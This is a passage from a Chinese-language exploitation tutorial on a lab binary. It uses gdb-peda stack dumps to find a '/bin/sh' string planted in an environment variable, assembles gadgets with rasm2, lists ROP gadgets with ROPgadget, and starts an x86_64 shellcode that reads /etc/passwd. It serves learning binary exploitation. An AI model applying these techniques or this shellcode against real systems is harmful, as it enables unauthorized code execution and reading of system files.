class="line">--More--(50/100)</span><br><span class="line">0400| 0x7fffffffde98 --&gt; 0x7fffffffe977 ("DESKTOP_SESSION=ubuntu")</span><br><span class="line">0408| 0x7fffffffdea0 --&gt; 0x7fffffffe98e ("QT4_IM_MODULE=fcitx")</span><br><span class="line">0416| 0x7fffffffdea8 --&gt; 0x7fffffffe9a2 ("TEXTDOMAINDIR=/usr/share/locale/")</span><br><span class="line">0424| 0x7fffffffdeb0 --&gt; 0x7fffffffe9c3 ("GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa")</span><br><span class="line">0432| 0x7fffffffdeb8 --&gt; 0x7fffffffea19 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")</span><br><span class="line">0440| 0x7fffffffdec0 --&gt; 0x7fffffffea4c ("PWD=/home/tianji/Desktop/sploit/bypassaslr_1")</span><br><span class="line">0448| 0x7fffffffdec8 --&gt; 0x7fffffffea79 ("LINES=24")</span><br><span class="line">0456| 0x7fffffffded0 --&gt; 0x7fffffffea82 ("HOME=/home/tianji")</span><br><span class="line">0464| 0x7fffffffded8 --&gt; 0x7fffffffea94 ("TEXTDOMAIN=im-config")</span><br><span class="line">0472| 0x7fffffffdee0 --&gt; 0x7fffffffeaa9 ("SSH_AGENT_PID=1606")</span><br><span class="line">0480| 0x7fffffffdee8 --&gt; 0x7fffffffeabc ("QT_ACCESSIBILITY=1")</span><br><span class="line">0488| 0x7fffffffdef0 --&gt; 0x7fffffffeacf ("XDG_SESSION_TYPE=x11")</span><br><span class="line">0496| 0x7fffffffdef8 --&gt; 0x7fffffffeae4 ("XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop")</span><br><span class="line">0504| 0x7fffffffdf00 --&gt; 0x7fffffffeb37 ("XDG_SESSION_DESKTOP=ubuntu")</span><br><span class="line">0512| 0x7fffffffdf08 --&gt; 0x7fffffffeb52 ("LC_ADDRESS=zh_CN.UTF-8")</span><br><span class="line">0520| 0x7fffffffdf10 --&gt; 0x7fffffffeb69 ("GJS_DEBUG_OUTPUT=stderr")</span><br><span class="line">0528| 0x7fffffffdf18 --&gt; 0x7fffffffeb81 ("LC_NUMERIC=zh_CN.UTF-8")</span><br><span class="line">0536| 0x7fffffffdf20 --&gt; 0x7fffffffeb98 ("ALL_PROXY=socks://127.0.0.1:1080/")</span><br><span class="line">0544| 0x7fffffffdf28 --&gt; 0x7fffffffebba ("no_proxy=localhost,127.0.0.0/8,::1")</span><br><span class="line">0552| 0x7fffffffdf30 --&gt; 0x7fffffffebdd ("GTK_MODULES=gail:atk-bridge")</span><br><span class="line">0560| 0x7fffffffdf38 --&gt; 0x7fffffffebf9 ("NO_PROXY=localhost,127.0.0.0/8,::1")</span><br><span class="line">0568| 0x7fffffffdf40 --&gt; 0x7fffffffec1c ("COLUMNS=79")</span><br><span class="line">0576| 0x7fffffffdf48 --&gt; 0x7fffffffec27 ("WINDOWPATH=1")</span><br><span class="line">0584| 0x7fffffffdf50 --&gt; 0x7fffffffec34 ("SHELL=/bin/bash")</span><br><span class="line">0592| 0x7fffffffdf58 --&gt; 0x7fffffffec44 ("VTE_VERSION=5201")</span><br></pre></td></tr></table></figure>
+<p>我们可以看到“SHELL=/bin/bash”的地址:<code>0x7fffffffec34</code>,然后去掉<code>SHELL</code>,这样“/bin/bash”的地址就是<code>0x7fffffffec3a</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/s 0x7fffffffec3a</span><br><span class="line">0x7fffffffec3a:	&quot;/bin/bash&quot;</span><br></pre></td></tr></table></figure>
+<p>当然，我这里是”/bin/bash”,所以这方法不可行。这时候，可以添加环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln</span><br><span class="line">Catchpoint 1 (exec)</span><br><span class="line">Reading symbols from vuln...done.</span><br><span class="line">gdb-peda$ b *main</span><br><span class="line">Breakpoint 2 at 0x739: file vuln.c, line 17.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln </span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x555555554790 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RDX: 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">RSI: 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class="line">RDI: 0x1 </span><br><span class="line">RBP: 0x555555554790 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">RSP: 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">RIP: 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">R8 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7dd0d80 --&gt; 0x0 </span><br><span class="line">R10: 0x0 </span><br><span class="line">R11: 0x1 </span><br><span class="line">R12: 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffddd0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55555555472a &lt;shell+16&gt;:	call   0x5555555545d0 &lt;system@plt&gt;</span><br><span class="line">   0x55555555472f &lt;shell+21&gt;:	mov    edi,0x0</span><br><span class="line">   0x555555554734 &lt;shell+26&gt;:	call   0x5555555545f0 &lt;exit@plt&gt;</span><br><span class="line">=&gt; 0x555555554739 &lt;main&gt;:	push   rbp</span><br><span class="line">   0x55555555473a &lt;main+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x55555555473d &lt;main+4&gt;:	sub    rsp,0x120</span><br><span class="line">   0x555555554744 &lt;main+11&gt;:	mov    DWORD PTR [rbp-0x114],edi</span><br><span class="line">   0x55555555474a &lt;main+17&gt;:	mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class="line">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class="line">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class="line">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">17	int main(int argc, char* argv[]) &#123;</span><br><span class="line">gdb-peda$ telescope 200</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:	mov    edi,eax)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class="line">0024| 0x7fffffffdd10 --&gt; 0x100008000 </span><br><span class="line">0032| 0x7fffffffdd18 --&gt; 0x555555554739 (&lt;main&gt;:	push   rbp)</span><br><span class="line">0040| 0x7fffffffdd20 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdd28 --&gt; 0x6b6b7edd8dce246d </span><br><span class="line">0056| 0x7fffffffdd30 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0064| 0x7fffffffdd38 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class="line">0072| 0x7fffffffdd40 --&gt; 0x0 </span><br><span class="line">0080| 0x7fffffffdd48 --&gt; 0x0 </span><br><span class="line">0088| 0x7fffffffdd50 --&gt; 0x3e3e2b88b8ee246d </span><br><span class="line">0096| 0x7fffffffdd58 --&gt; 0x3e3e3b37b470246d </span><br><span class="line">0104| 0x7fffffffdd60 --&gt; 0x7fff00000000 </span><br><span class="line">0112| 0x7fffffffdd68 --&gt; 0x0 </span><br><span class="line">0120| 0x7fffffffdd70 --&gt; 0x0 </span><br><span class="line">0128| 0x7fffffffdd78 --&gt; 0x7ffff7de5733 (&lt;_dl_init+259&gt;:	add    r14,0x8)</span><br><span class="line">0136| 0x7fffffffdd80 --&gt; 0x7ffff7dcb638 --&gt; 0x7ffff7b7de10 --&gt; 0x8348535554415541 </span><br><span class="line">0144| 0x7fffffffdd88 --&gt; 0x22bf66c6 </span><br><span class="line">0152| 0x7fffffffdd90 --&gt; 0x0 </span><br><span class="line">0160| 0x7fffffffdd98 --&gt; 0x0 </span><br><span class="line">0168| 0x7fffffffdda0 --&gt; 0x0 </span><br><span class="line">0176| 0x7fffffffdda8 --&gt; 0x555555554610 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0184| 0x7fffffffddb0 --&gt; 0x7fffffffddd0 --&gt; 0x1 </span><br><span class="line">0192| 0x7fffffffddb8 --&gt; 0x55555555463a (&lt;_start+42&gt;:	hlt)</span><br><span class="line">--More--(25/200)</span><br><span class="line">0200| 0x7fffffffddc0 --&gt; 0x7fffffffddc8 --&gt; 0x1c </span><br><span class="line">0208| 0x7fffffffddc8 --&gt; 0x1c </span><br><span class="line">0216| 0x7fffffffddd0 --&gt; 0x1 </span><br><span class="line">0224| 0x7fffffffddd8 --&gt; 0x7fffffffe18d (&quot;/home/tianji/Desktop/sploit/bypassaslr_1/vuln&quot;)</span><br><span class="line">0232| 0x7fffffffdde0 --&gt; 0x0 </span><br><span class="line">0240| 0x7fffffffdde8 --&gt; 0x7fffffffe1bb (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">0248| 0x7fffffffddf0 --&gt; 0x7fffffffe1d1 (&quot;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc&quot;...)</span><br><span class="line">0256| 0x7fffffffddf8 --&gt; 0x7fffffffe7bd (&quot;LC_MEASUREMENT=zh_CN.UTF-8&quot;)</span><br><span class="line">0264| 0x7fffffffde00 --&gt; 0x7fffffffe7d8 (&quot;LESSCLOSE=/usr/bin/lesspipe %s %s&quot;)</span><br><span class="line">0272| 0x7fffffffde08 --&gt; 0x7fffffffe7fa (&quot;LC_PAPER=zh_CN.UTF-8&quot;)</span><br><span class="line">0280| 0x7fffffffde10 --&gt; 0x7fffffffe80f (&quot;LC_MONETARY=zh_CN.UTF-8&quot;)</span><br><span class="line">0288| 0x7fffffffde18 --&gt; 0x7fffffffe827 (&quot;XDG_MENU_PREFIX=gnome-&quot;)</span><br><span class="line">0296| 0x7fffffffde20 --&gt; 0x7fffffffe83e (&quot;_=/usr/bin/gdb&quot;)</span><br><span class="line">0304| 0x7fffffffde28 --&gt; 0x7fffffffe84d (&quot;LANG=en_US.UTF-8&quot;)</span><br><span class="line">0312| 0x7fffffffde30 --&gt; 0x7fffffffe85e (&quot;DISPLAY=:0&quot;)</span><br><span class="line">0320| 0x7fffffffde38 --&gt; 0x7fffffffe869 (&quot;ABC=/bin/sh&quot;)</span><br><span class="line">0328| 0x7fffffffde40 --&gt; 0x7fffffffe875 (&quot;OLDPWD=/home/tianji/Desktop/sploit&quot;)</span><br><span class="line">0336| 0x7fffffffde48 --&gt; 0x7fffffffe898 (&quot;GNOME_SHELL_SESSION_MODE=ubuntu&quot;)</span><br><span class="line">0344| 0x7fffffffde50 --&gt; 0x7fffffffe8b8 (&quot;COLORTERM=truecolor&quot;)</span><br><span class="line">0352| 0x7fffffffde58 --&gt; 0x7fffffffe8cc (&quot;USERNAME=tianji&quot;)</span><br><span class="line">0360| 0x7fffffffde60 --&gt; 0x7fffffffe8dc (&quot;XDG_VTNR=1&quot;)</span><br><span class="line">0368| 0x7fffffffde68 --&gt; 0x7fffffffe8e7 (&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;)</span><br><span class="line">0376| 0x7fffffffde70 --&gt; 0x7fffffffe910 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0384| 0x7fffffffde78 --&gt; 0x7fffffffe946 (&quot;LC_NAME=zh_CN.UTF-8&quot;)</span><br><span class="line">0392| 0x7fffffffde80 --&gt; 0x7fffffffe95a (&quot;XDG_SESSION_ID=1&quot;)</span><br></pre></td></tr></table></figure>
+<p>可以看到”/bin/sh”的地址：<code>0x7fffffffe869 + 0x6 = 0x7fffffffe86e</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/s 0x7fffffffe86e</span><br><span class="line">0x7fffffffe86e:	&quot;bin/sh&quot;</span><br></pre></td></tr></table></figure>
+<p>当然，这个方法仅限本地使用。</p>
+<h2 id="反汇编代码"><a href="#反汇编代码" class="headerlink" title="反汇编代码"></a>反汇编代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;jmp rsp&quot;</span><br><span class="line">ffe4</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 &quot;pop rdi; ret&quot;</span><br><span class="line">5fc3</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm &quot;5fc3&quot;</span><br><span class="line">   0:    5f                       pop    edi</span><br><span class="line">   1:    c3                       ret</span><br></pre></td></tr></table></figure>
+<h2 id="在可执行文件中找gadget"><a href="#在可执行文件中找gadget" class="headerlink" title="在可执行文件中找gadget"></a>在可执行文件中找gadget</h2><p>方法一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln</span><br><span class="line">0x7f3</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............</span><br><span class="line">0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........</span><br><span class="line">0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..</span><br><span class="line">0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................</span><br><span class="line">0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\....</span><br></pre></td></tr></table></figure>
+<p>可以看到5fc3的偏移位置就是: ‘0x7f3’</p>
+<p>方法二:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000000707 : add bl, dh ; ret</span><br><span class="line">0x00000000000007ff : add bl, dh ; ret</span><br><span class="line">0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x0000000000000788 : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000706 : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000007fe : add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000000789 : add cl, cl ; ret</span><br><span class="line">0x00000000000005a3 : add esp, 8 ; ret</span><br><span class="line">0x0000000000000809 : add esp, 8 ; ret</span><br><span class="line">0x00000000000005a2 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000000808 : add rsp, 8 ; ret</span><br><span class="line">0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax</span><br><span class="line">0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000007d9 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007da : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x00000000000005a0 : call rax</span><br><span class="line">0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x000000000000059e : je 0x5a4 ; call rax</span><br><span class="line">0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax</span><br><span class="line">0x0000000000000664 : jmp rax</span><br><span class="line">0x00000000000006b5 : jmp rax</span><br><span class="line">0x000000000000078a : leave ; ret</span><br><span class="line">0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret</span><br><span class="line">0x0000000000000785 : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000000007f8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000000701 : nop dword ptr [rax] ; ret</span><br><span class="line">0x00000000000006b3 : or al, 0x5d ; jmp rax</span><br><span class="line">0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007f0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007f2 : pop r15 ; ret</span><br><span class="line">0x0000000000000663 : pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b4 : pop rbp ; jmp rax</span><br><span class="line">0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000000670 : pop rbp ; ret</span><br><span class="line">0x00000000000006c0 : pop rbp ; ret</span><br><span class="line">0x00000000000006ff : pop rbp ; ret</span><br><span class="line">0x00000000000007f3 : pop rdi ; ret</span><br><span class="line">0x00000000000007f1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000005a6 : ret</span><br><span class="line">0x0000000000000671 : ret</span><br><span class="line">0x00000000000006c1 : ret</span><br><span class="line">0x0000000000000700 : ret</span><br><span class="line">0x0000000000000709 : ret</span><br><span class="line">0x0000000000000708 : ret</span><br><span class="line">0x000000000000078b : ret</span><br><span class="line">0x00000000000007df : ret</span><br><span class="line">0x00000000000007f4 : ret</span><br><span class="line">0x0000000000000801 : ret</span><br><span class="line">0x0000000000000800 : ret</span><br><span class="line">0x000000000000080c : ret</span><br><span class="line">0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax</span><br><span class="line">0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax</span><br><span class="line">0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax</span><br><span class="line">0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax</span><br><span class="line">0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 85</span><br><span class="line">tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep &quot;pop rdi ; ret&quot;</span><br><span class="line">0x00000000000007f3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+<h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><p>读取/etc/passwd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">BITS 64 </span><br><span class="line">; Author Mr.Un1k0d3r - RingZer0 Team </span><br><span class="line">; Read /etc/passwd Linux x86_64 Shellcode </span><br><span class="line">; Shellcode size 82 bytes </span><br><span class="line">global _start </span><br><span class="line">section .text </span><br><span class="line">_start: </span><br><span class="line">    jmp _push_filename </span><br><span class="line"></span><br><span class="line">_readfile: </span><br><span class="line">    ; syscall open file </span><br><span class="line">    pop rdi   ; pop path value </span><br><span class="line">    ; NULL byte fix 